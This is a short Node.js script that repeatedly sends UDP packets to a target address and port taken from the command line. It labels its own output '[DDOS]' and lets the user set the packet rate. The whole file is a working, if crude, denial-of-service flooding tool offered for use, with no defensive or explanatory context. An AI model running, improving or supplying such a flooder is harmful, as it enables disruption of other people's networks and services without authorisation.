const dgram = require('dgram');
const client = dgram.createSocket('udp4');

const args = process.argv;

const address = args[2] 
const port = args[3]

const times = args[4] ?? 1000

if(!address || !port)
  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')

client.on('error', (e) => {
  console.log('[ERROR]: ' + e)
  process.kill(process.pid);
})

setInterval(() => {
    client.send('', 0, 0, port, address);
    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
}, (1000 / (times <= 0 ? 1000 : times)))
    
